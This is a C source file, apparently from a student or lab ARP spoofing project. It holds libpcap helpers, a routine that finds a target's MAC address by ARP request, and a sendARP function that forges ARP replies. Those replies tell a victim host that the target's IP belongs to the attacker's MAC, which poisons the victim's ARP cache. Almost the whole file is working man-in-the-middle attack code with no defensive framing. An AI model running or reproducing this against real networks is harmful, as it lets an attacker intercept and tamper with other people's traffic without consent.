#include "arpspoof.h"

int getpacket(pcap_t *hd, struct pcap_pkthdr **h, const u_char **p){
	int res;
	while(!(res = pcap_next_ex(hd,h,p)));
	return res>0;
}  

void printMAC(struct Address *p){
	for(int i=0;i<5;i++) printf("%02x:",p->MAC[i]);
	printf("%02x\n",p->MAC[5]);
}

void printIP(struct Address *p){
  for(int i=0;i<3; i++) printf("%d.",p->IP[i]);
  printf("%d",p->IP[3]);
}
    
int isARP(const u_char *p){
  struct ether_header *ethh;
  ethh = (struct ether_header *)p;
  return (ntohs(ethh->ether_type)==ETHERTYPE_ARP);
}

void getMACaddr(pcap_t *handle, struct Address *target, struct Address *sender){
  uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
  const u_char *raw;
  struct pcap_pkthdr* header;

  arp_hdr arpp;

  memcpy(arpp.sender_mac1, sender->MAC, 6);
  memcpy(arpp.target_mac1, broadcast,6);
  arpp.ethertype=htons(ETHERTYPE_ARP);
  arpp.hd_type=htons(ARPHRD_ETHER);
  arpp.p_type=htons(ETHERTYPE_IP);
  arpp.hd_len=ETHER_ADDR_LEN;
  arpp.p_len=sizeof(in_addr_t);
  arpp.opcode = htons(ARPOP_REQUEST);
  memcpy(arpp.sender_mac2,sender->MAC,6);
  memcpy(arpp.target_mac2,broadcast,6);
  memcpy(arpp.sender_ip,sender->IP,4);
  memcpy(arpp.target_ip,target->IP,4);

  arp_hdr *reply = &arpp ;

  int repeatnum =10;
  
  while(!((memcmp(reply->target_mac1, sender->MAC, 6)) &&
          ntohs(reply->ethertype)== ETHERTYPE_ARP &&
          ntohs(reply->opcode) == ARPOP_REPLY &&
          (!memcmp(reply->sender_ip, target->IP, 4)) &&
          (!memcmp(reply->target_ip, sender->IP, 4)) &&
          (!memcmp(reply->target_mac2, sender->MAC, 6)))){
    if(repeatnum--){
      pcap_sendpacket(handle, (u_char *)&arpp, sizeof(arpp));
    }
    getpacket(handle, &header, &raw);
    reply = (arp_hdr *)raw;
  }

  memcpy(target->MAC, reply->sender_mac1,6);

}


void sendARP(pcap_t *handle, struct session_class *s, struct Address *attacker){
  arp_hdr packet;
  memcpy(packet.sender_mac1, attacker->MAC, 6);
  memcpy(packet.target_mac1, s->sender.MAC, 6);
  packet.ethertype=htons(ETHERTYPE_ARP);
  packet.hd_type=htons(ARPHRD_ETHER);
  packet.p_type=htons(ETHERTYPE_IP);
  packet.hd_len=ETHER_ADDR_LEN;
  packet.p_len=sizeof(in_addr_t);
  packet.opcode = htons(ARPOP_REPLY);
  memcpy(packet.sender_mac2, attacker->MAC,6);
  memcpy(packet.target_mac2, s->sender.MAC,6);
  memcpy(packet.sender_ip, s->target.IP, 4);
  memcpy(packet.target_ip, s->sender.IP ,4);
  
  pcap_sendpacket(handle, (u_char *)&packet, sizeof(packet));
}
